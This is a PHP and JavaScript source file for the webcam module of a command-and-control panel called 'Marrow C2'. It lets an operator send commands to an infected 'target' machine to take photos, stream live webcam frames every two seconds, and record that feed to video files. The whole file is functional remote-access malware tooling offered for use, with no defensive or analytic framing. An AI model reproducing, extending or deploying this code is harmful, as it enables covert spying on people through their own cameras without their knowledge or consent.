<?php
// Marrow C2 - Webcam Module
// Capture photos from target webcam
?>
<div id="cam-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-14 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-4">
            <span class="text-white font-medium">📹 Webcam</span>
            <span id="cam-status" class="text-xs px-2 py-1 bg-[#1a1f2e] rounded-lg text-gray-400">Ready</span>
        </div>
        <div class="flex items-center gap-3">
            <button onclick="CAM.capture()"
                class="px-5 py-2.5 bg-gradient-to-r from-[#10b981] to-[#059669] hover:from-[#0ea573] hover:to-[#047857] text-white rounded-xl text-sm font-medium transition-all flex items-center gap-2">
                📸 Capture Photo
            </button>
            <button id="cam-live-btn" onclick="CAM.toggleLive()"
                class="px-5 py-2.5 bg-gradient-to-r from-[#6366f1] to-[#4f46e5] hover:from-[#5558e3] hover:to-[#4338ca] text-white rounded-xl text-sm font-medium transition-all flex items-center gap-2">
                🔴 Live View
            </button>
            <button id="cam-rec-btn" onclick="CAM.toggleRecord()"
                class="hidden px-5 py-2.5 bg-gradient-to-r from-[#f59e0b] to-[#d97706] hover:from-[#d97706] hover:to-[#b45309] text-white rounded-xl text-sm font-medium transition-all flex items-center gap-2">
                ⏺️ Record
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <div class="flex-1 flex overflow-hidden">
        <!-- Preview -->
        <div class="flex-1 flex items-center justify-center p-6 bg-black/50">
            <div id="cam-preview" class="relative">
                <!-- Placeholder -->
                <div id="cam-placeholder" class="text-center">
                    <div class="text-8xl mb-6 opacity-30">📹</div>
                    <h3 class="text-xl text-gray-400 mb-2">Webcam Capture</h3>
                    <p class="text-sm text-gray-600 mb-6">Click "Capture Photo" to take a snapshot from target webcam
                    </p>
                    <div class="text-xs text-gray-700 bg-[#0f1219] px-4 py-2 rounded-lg inline-block">
                        ⚠️ Requires FFmpeg on target system
                    </div>
                </div>

                <!-- Captured Image -->
                <img id="cam-image"
                    class="hidden max-w-full max-h-[70vh] rounded-xl shadow-2xl border border-[#2a3142]">

                <!-- Loading -->
                <div id="cam-loading" class="hidden text-center">
                    <div class="text-6xl mb-4 animate-pulse">📹</div>
                    <p class="text-gray-400">Capturing...</p>
                    <p class="text-xs text-gray-600 mt-2">This may take a few seconds</p>
                </div>
            </div>
        </div>

        <!-- Gallery Sidebar -->
        <div class="w-64 bg-[#0a0f1a] border-l border-[#1e2433] p-4 overflow-auto">
            <div class="text-xs text-gray-500 uppercase tracking-wider mb-3">Captured Photos</div>
            <div id="cam-gallery" class="space-y-2">
                <div class="text-sm text-gray-600 text-center py-8">No captures yet</div>
            </div>
        </div>
    </div>

    <!-- Info Bar -->
    <div class="h-10 bg-[#0a0f1a] border-t border-[#1e2433] flex items-center justify-between px-4 text-xs">
        <span id="cam-info" class="text-gray-500">Click capture to take a photo</span>
        <button onclick="CAM.save()" id="cam-save-btn"
            class="hidden px-3 py-1.5 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-lg transition-colors">
            💾 Save Image
        </button>
    </div>
</div>

<script>
    const CAM = {
        captures: [],
        currentImage: null,
        liveInterval: null,
        isLive: false,
        
        // Recording
        isRecording: false,
        mediaRecorder: null,
        recordedChunks: [],
        canvas: document.createElement('canvas'),
        ctx: null,

        init() {
            this.ctx = this.canvas.getContext('2d');
        },

        capture() {
            this.stopLive();
            document.getElementById('cam-placeholder').classList.add('hidden');
            document.getElementById('cam-image').classList.add('hidden');
            document.getElementById('cam-loading').classList.remove('hidden');
            document.getElementById('cam-status').textContent = 'Capturing...';
            document.getElementById('cam-status').classList.add('text-yellow-400');

            queueCommand('webcam');
        },

        toggleLive() {
            if (this.isLive) {
                this.stopLive();
            } else {
                this.startLive();
            }
        },

        startLive() {
            this.isLive = true;
            document.getElementById('cam-live-btn').innerHTML = '⏹️ Stop Live';
            document.getElementById('cam-live-btn').classList.remove('from-[#6366f1]', 'to-[#4f46e5]');
            document.getElementById('cam-live-btn').classList.add('from-[#ef4444]', 'to-[#dc2626]');
            document.getElementById('cam-status').textContent = 'Live';
            document.getElementById('cam-status').classList.add('text-green-400');
            document.getElementById('cam-placeholder').classList.add('hidden');
            document.getElementById('cam-loading').classList.remove('hidden');
            document.getElementById('cam-info').textContent = 'Starting live stream...';
            
            // Show record button
            document.getElementById('cam-rec-btn').classList.remove('hidden');

            // Request first frame
            queueCommand('webcam_live');

            // Request frames every 2 seconds
            this.liveInterval = setInterval(() => {
                if (this.isLive) {
                    queueCommand('webcam_live');
                }
            }, 2000);
        },

        stopLive() {
            if (this.isRecording) this.stopRecord();
            
            this.isLive = false;
            if (this.liveInterval) {
                clearInterval(this.liveInterval);
                this.liveInterval = null;
            }
            document.getElementById('cam-live-btn').innerHTML = '🔴 Live View';
            document.getElementById('cam-live-btn').classList.remove('from-[#ef4444]', 'to-[#dc2626]');
            document.getElementById('cam-live-btn').classList.add('from-[#6366f1]', 'to-[#4f46e5]');
            document.getElementById('cam-status').textContent = 'Ready';
            document.getElementById('cam-status').classList.remove('text-green-400', 'text-yellow-400');
            
            // Hide record button
            document.getElementById('cam-rec-btn').classList.add('hidden');
        },
        
        // Recording Logic
        toggleRecord() {
            if (this.isRecording) {
                this.stopRecord();
            } else {
                this.startRecord();
            }
        },
        
        startRecord() {
            if (!this.isLive) return;
            
            try {
                const stream = this.canvas.captureStream(30); // 30 FPS stream from canvas
                this.mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                this.recordedChunks = [];
                
                this.mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) this.recordedChunks.push(e.data);
                };
                
                this.mediaRecorder.onstop = () => {
                    const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `webcam_rec_${Date.now()}.webm`;
                    a.click();
                    URL.revokeObjectURL(url);
                };
                
                this.mediaRecorder.start();
                this.isRecording = true;
                
                const btn = document.getElementById('cam-rec-btn');
                btn.innerHTML = '⏹️ Stop Rec';
                btn.classList.add('animate-pulse');
                
            } catch (e) {
                alert('Recording failed: ' + e.message);
            }
        },
        
        stopRecord() {
            if (this.mediaRecorder && this.isRecording) {
                this.mediaRecorder.stop();
                this.isRecording = false;
                
                const btn = document.getElementById('cam-rec-btn');
                btn.innerHTML = '⏺️ Record';
                btn.classList.remove('animate-pulse');
            }
        },

        renderLive(data) {
            // Handle B64|w|h|data format from webcam_live
            if (data.startsWith('B64|')) {
                const parts = data.split('|');
                if (parts.length >= 4) {
                    const base64Data = parts.slice(3).join('|');
                    this.showLiveFrame(base64Data);
                }
            } else if (data.includes('error')) {
                document.getElementById('cam-info').textContent = 'Live stream error';
                this.stopLive();
            }
        },

        showLiveFrame(base64Data) {
            const img = document.getElementById('cam-image');
            img.src = 'data:image/jpeg;base64,' + base64Data;
            img.classList.remove('hidden');
            document.getElementById('cam-loading').classList.add('hidden');
            document.getElementById('cam-placeholder').classList.add('hidden');
            document.getElementById('cam-info').textContent = 'Live • ' + new Date().toLocaleTimeString();
            
            // Draw to canvas for recording
            if (this.isRecording || this.isLive) {
                const image = new Image();
                image.onload = () => {
                    if (this.canvas.width !== image.width) this.canvas.width = image.width;
                    if (this.canvas.height !== image.height) this.canvas.height = image.height;
                    this.ctx.drawImage(image, 0, 0);
                };
                image.src = img.src;
            }
        },

        render(data) {
            document.getElementById('cam-loading').classList.add('hidden');

            if (data.includes('error') || data.includes('ffmpeg')) {
                document.getElementById('cam-placeholder').classList.remove('hidden');
                document.getElementById('cam-status').textContent = 'Error';
                document.getElementById('cam-status').classList.remove('text-yellow-400');
                document.getElementById('cam-status').classList.add('text-red-400');
                document.getElementById('cam-info').textContent = 'Webcam capture failed - FFmpeg required';
                return;
            }
            
            // Handle B64 capture response
            if (data.startsWith('B64|')) {
                const parts = data.split('|');
                if (parts.length >= 2) {
                   const b64 = parts[1];
                   this.showCapture(b64);
                   return;
                }
            }

            // Capture was started - wait for result
            document.getElementById('cam-status').textContent = 'Processing...';
        },

        showCapture(base64Data) {
            this.currentImage = base64Data;

            const img = document.getElementById('cam-image');
            img.src = 'data:image/jpeg;base64,' + base64Data;
            img.classList.remove('hidden');

            document.getElementById('cam-placeholder').classList.add('hidden');
            document.getElementById('cam-loading').classList.add('hidden');
            document.getElementById('cam-save-btn').classList.remove('hidden');

            document.getElementById('cam-status').textContent = 'Captured';
            document.getElementById('cam-status').classList.remove('text-yellow-400');
            document.getElementById('cam-status').classList.add('text-green-400');

            const now = new Date().toLocaleTimeString();
            document.getElementById('cam-info').textContent = `Captured at ${now}`;

            // Add to gallery
            this.captures.unshift(base64Data);
            this.updateGallery();
        },

        updateGallery() {
            const gallery = document.getElementById('cam-gallery');
            if (this.captures.length === 0) {
                gallery.innerHTML = '<div class="text-sm text-gray-600 text-center py-8">No captures yet</div>';
                return;
            }

            gallery.innerHTML = this.captures.map((cap, i) => `
            <div class="cursor-pointer group" onclick="CAM.viewCapture(${i})">
                <img src="data:image/jpeg;base64,${cap}" class="w-full rounded-lg border border-[#2a3142] group-hover:border-[#6366f1] transition-colors">
            </div>
        `).join('');
        },

        viewCapture(idx) {
            this.currentImage = this.captures[idx];
            const img = document.getElementById('cam-image');
            img.src = 'data:image/jpeg;base64,' + this.currentImage;
            img.classList.remove('hidden');
            document.getElementById('cam-placeholder').classList.add('hidden');
            document.getElementById('cam-save-btn').classList.remove('hidden');
        },

        save() {
            if (this.currentImage) {
                const a = document.createElement('a');
                a.href = 'data:image/jpeg;base64,' + this.currentImage;
                a.download = `webcam_${Date.now()}.jpg`;
                a.click();
            }
        }
    };
    CAM.init();</script>